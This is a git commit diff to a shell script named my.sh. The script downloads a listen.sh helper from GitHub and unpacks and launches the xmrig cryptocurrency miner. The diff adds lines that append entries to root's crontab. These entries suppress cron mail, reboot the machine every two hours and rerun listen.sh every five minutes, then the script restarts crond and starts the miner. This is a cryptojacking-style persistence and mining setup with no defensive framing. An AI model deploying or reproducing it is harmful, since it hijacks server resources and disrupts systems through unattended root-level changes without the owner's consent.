0ee65da10edd4b0beb9cdccd0b7d78e6292ad5cf
zy123456-zhong <61346716+zy123456-zhong@users.noreply.github.com>
2020-03-03 23:25:08 +0800

    Update my.sh

--- my.sh
+++ my.sh
@@ -4,5 +4,10 @@ wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/listen.sh
 unzip xmrig-5.7.0.zip 
 chmod +x xmrig-5.7.0/xmrig
 chmod +x listen.sh
+echo "MAILTO=""" >> /var/spool/cron/root
+echo "0 */2 * * * /usr/sbin/reboot" >> /var/spool/cron/root
+echo "*/5 * * * * /root/listen.sh" >> /var/spool/cron/root
+service crond restart
+./xmrig-5.7.0/xmrig
 
 
